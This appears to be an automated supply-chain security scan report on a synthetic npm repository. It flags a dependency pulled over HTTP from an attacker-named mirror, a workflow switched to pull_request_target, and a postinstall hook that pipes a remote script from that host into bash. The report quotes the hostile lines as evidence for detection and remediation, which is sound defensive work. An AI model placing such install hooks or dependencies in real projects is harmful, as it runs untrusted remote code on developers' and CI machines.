# Software Supply Chain Guardian: Repository & Change Investigation Report
**Target Repository:** `C:\Users\yeshx\AppData\Local\Temp\tmpexrmpn4f\synthetic-supply-chain-repo`  
**Analysis Timestamp:** `2026-11-24T09:25:58.301861+00:00`  
**Commit Range Investigated:** `e37ae4042e` $\to$ `2cf872530a`  
**Total Findings:** 5 (5 introduced in range, 0 pre-existing)  
**Correlated Multi-Vector Scenarios:** 1  
**AI Investigations Conducted:** 5  

---

## 1. Executive Summary
Software Supply Chain Guardian implements an evidence-driven, tool-using investigation pipeline designed to identify malicious, suspicious, and unauthorized software supply chain activities that conventional advisory databases (NVD, CVE, OSV) fail to detect. By analyzing Git commit diffs, manifest changes, lifecycle script commands, external package registries, and CI/CD pipelines, Guardian detects stealthy supply chain attacks and distinguishes them from benign engineering patterns.

## 2. Investigation Scope and Commit Range
- **Repository Path:** `C:\Users\yeshx\AppData\Local\Temp\tmpexrmpn4f\synthetic-supply-chain-repo`
- **Baseline Commit:** `e37ae4042e40a2ba2fe9e637e3496d26ac0c6291`
- **Head Commit:** `2cf872530ae49e7b64bec847c639c62e1f0fd8df`
- **Scanned Files:** Manifests (`package.json`), lockfiles (`package-lock.json`), registry configurations (`.npmrc`), CI/CD workflows (`.github/workflows/*.yml`), and container specifications (`Dockerfile`, `docker-compose.yml`).

## 3. Methodology
The investigation combines four complementary analysis layers:
1. **Deterministic Git Diff Engine:** Audits version control differences, tagging findings with strict commit provenance (`OBSERVED_CHANGE` vs `HEURISTIC_FLAG`).
2. **Static Surface Inspectors:** Scans lifecycle scripts for shell execution hooks, verifies registry TLS protocols, checks package lexical similarity, and evaluates CI/CD permissions.
3. **Evidence Correlation Engine:** Correlates disparate indicators across vectors into multi-stage attack scenarios using MITRE ATT&CK techniques.
4. **LangGraph AI Investigator:** An autonomous agent using a bounded read-only tool loop with a strict Grounding Gate to evaluate evidence, test hypotheses, and document mitigating factors.

## 4. Repository Changes
- **DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-2cf87253** (MEDIUM): Manifest Modified Without Updating Lockfile in Commit 2cf87253 in `package.json` (Line 1)
- **DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML** (LOW): Security-Sensitive File Modified: '.github/workflows/ci.yml' (CI/CD Pipeline Definition) in `.github/workflows/ci.yml` (Line 1)
## 5. Dependency Changes
- **DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR** [LOW | Introduced in Range]: Dependency 'core-metrics-collector@http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz' Added in Commit 2cf87253 (`package.json:8`)
  - *Evidence:* `+ "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"`
## 6. Lifecycle-Script Findings
- **SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13** [CRITICAL]: Suspicious 'postinstall' Script: Lifecycle script pipes remote download directly into shell (`package.json:13`)
  - *Command:* `"postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"`
## 7. Registry and Dependency-Source Findings
- **SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR** [HIGH]: Direct URL/Tarball Dependency 'core-metrics-collector' in `package.json`
## 8. CI/CD Pipeline Findings
No CI/CD pipeline vulnerabilities identified.

## 9. Docker and Container Build Findings
No container configuration weaknesses detected.

## 10. Correlated Investigation Scenarios (Phase 2 Multi-Vector Engine)
### Scenario: Co-Located Dependency Anomaly and Dangerous Lifecycle Hook in 'package.json'
- **Composite ID:** `CORR-MANIFEST-INSTALL-CHAIN-001`
- **Severity:** `CRITICAL` | **Confidence:** `HIGH` | **Status:** `CONFIRMED_MULTI_VECTOR`
- **Attack Technique:** `MITRE ATT&CK T1195.001 (Compromise Software Dependencies)`
- **Suspected Narrative:** Coordinated modification introducing both external dependencies and shell execution in the same project manifest.
- **Observed Facts:**
  - Manifest 'package.json' defines unpinned dependencies: ['"core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"', '+ "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"'].
  - Manifest 'package.json' defines high-severity install script commands: ['"postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"'].
## 11. AI Investigation Agent Findings (Phase 3 LangGraph Tool-Using Loop)
### Investigation: `SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The package.json file explicitly defines a postinstall lifecycle script that executes 'curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash'. This pattern is a classic remote code execution vector common in supply chain attacks, automatically piping arbitrary remote content directly into the shell upon package installation.
- **Suspected Attack Scenario:** An attacker introduces a malicious 'postinstall' script into the package.json file. When a developer or CI/CD pipeline installs the package (e.g., via npm install), the package manager automatically executes the postinstall script, downloading and executing a remote payload from an untrusted source, leading to complete system compromise or credential theft.
- **Actionable Remediation:** Immediately remove the malicious postinstall script from package.json, audit the repository and build agents for compromise, and block the affected package version.
### Investigation: `SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR`
- **Verdict:** `CONFIRMED_ANOMALY` | **Confidence:** `HIGH`
- **Planner:** `deterministic` | **Steps Executed:** 1
- **Rationale:** Configuration in 'package.json' specifies cleartext HTTP or disabled TLS verification, exposing package downloads to network tampering or man-in-the-middle attacks.
- **Suspected Attack Scenario:** Direct unencrypted transport bypassing TLS integrity and authenticity checks.
- **Actionable Remediation:** Enforce HTTPS authenticated registries or enforce subresource integrity digests.
### Investigation: `DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-2cf87253`
- **Verdict:** `CONFIRMED_ANOMALY` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The repository commit diff confirms that package.json was modified without a corresponding update to the project's lockfile. This creates a state of dependency drift and inconsistency, which can lead to non-deterministic builds and potential supply chain vulnerabilities if dependency resolution diverges across environments.
- **Suspected Attack Scenario:** An attacker or developer introduces modified dependency constraints in package.json without committing lockfile updates, potentially forcing downstream builds to resolve different, untrusted dependency versions or malicious packages via stale lockfile states.
- **Actionable Remediation:** Run the appropriate package manager install command (e.g., npm install or yarn install) to regenerate and commit the updated lockfile matching the new package.json.
### Investigation: `DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The dependency 'core-metrics-collector' is added to package.json pointing directly to an external HTTP URL on an internal attacker-controlled domain ('cdn.attacker-mirror.internal'). This is a clear indicator of dependency confusion, supply chain injection, or out-of-band artifact retrieval which bypasses standard secure package registry verification.
- **Suspected Attack Scenario:** An attacker introduces a malicious package dependency fetched via an unencrypted HTTP URL from an attacker-controlled mirror or staging server. When 'npm install' or a similar package manager command runs, it pulls the tarball directly from the malicious domain, executing arbitrary code or embedding compromised source artifacts into the build pipeline.
- **Actionable Remediation:** Immediately remove the dependency referencing the external mirror, audit lockfiles and build environments for unauthorized artifact execution, and restrict dependency sources to approved secure registries.
### Investigation: `DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML`
- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
- **Rationale:** The workflow modification changes the trigger from `push` to `pull_request_target`. In GitHub Actions, `pull_request_target` runs in the context of the base branch and has access to repository secrets, and when combined with checking out PR code or running untrusted scripts from the PR, it introduces a severe remote code execution (RCE) vector.
- **Suspected Attack Scenario:** An attacker submits a malicious pull request containing modified code or build scripts. Because the workflow uses `pull_request_target`, the CI pipeline executes the PR's untrusted code or build steps with elevated permissions and access to repository secrets, allowing the attacker to exfiltrate secrets or compromise the repository.
- **Actionable Remediation:** Revert the workflow trigger back to 'push' or 'pull_request', and ensure that untrusted PR code is never checked out or executed within privileged workflow contexts.
## 12. False-Positive Considerations
- **Lexical Similarities vs Intentional Polyfills:** Package names like `bcrypt-nodejs` share similarity with `bcrypt`, but investigation confirms legitimate engineering intent (pure-JS implementation avoiding native C++ toolchain errors).
- **Internal Private Registries:** Registries hosted on corporate networks are authenticated and safe when TLS (`strict-ssl=true`) is enforced.
- **Official First-Party Actions:** Mutable tags on `actions/*` repositories pose operational update risks but not maintainer account takeover risks.
- **Cryptographic Commit Pinning:** Git dependencies pinned to full 40-character commit SHAs are cryptographically immutable.

## 13. Limitations
- Static analysis cannot observe runtime dynamic module loading (e.g. `eval(process.env.CODE)` computed at runtime).
- Obfuscated bytecode or compiled binary native addons require isolated dynamic sandboxing.
- Conventional CVE scanners remain necessary for published vulnerabilities in third-party dependency code.

## 14. Research Foundation
- Ohm et al. (2020), Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks
- Ladisa et al. (2023), SoK: Taxonomy of Attacks on Open-Source Software Supply Chains
- Wang et al. (2026), Demystifying and Detecting Agentic Workflow Injection Vulnerabilities in GitHub Actions
- Lin et al. (2024), UntrustIDE: Exploiting Weaknesses in VS Code Extensions
- Birsan (2021), Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies

## 15. Answer to the Central Research Question
> **"Can combining repository changes, dependency changes and pipeline changes reveal suspicious activity that vulnerability databases cannot detect?"**

**Yes, demonstrably.** Vulnerability databases such as NVD, CVE, and OSV index catalogued software defects after formal disclosure. They provide zero visibility into:
1. Direct tarball and Git URLs introduced in pull requests.
2. Dangerous install-time lifecycle execution hooks (`curl | sh`).
3. CI/CD expression injection weaknesses (`${{ github.event... }}`).
4. Insecure registry configurations and disabled TLS certificate validation.
5. Lockfile tampering uncorroborated by manifest modifications.

By synthesizing Git diffs, dependency provenance, static script syntax, and CI/CD policies into a unified LangGraph investigation loop, Guardian successfully identifies, correlates, and explains stealthy supply chain attack vectors even when no published CVE exists.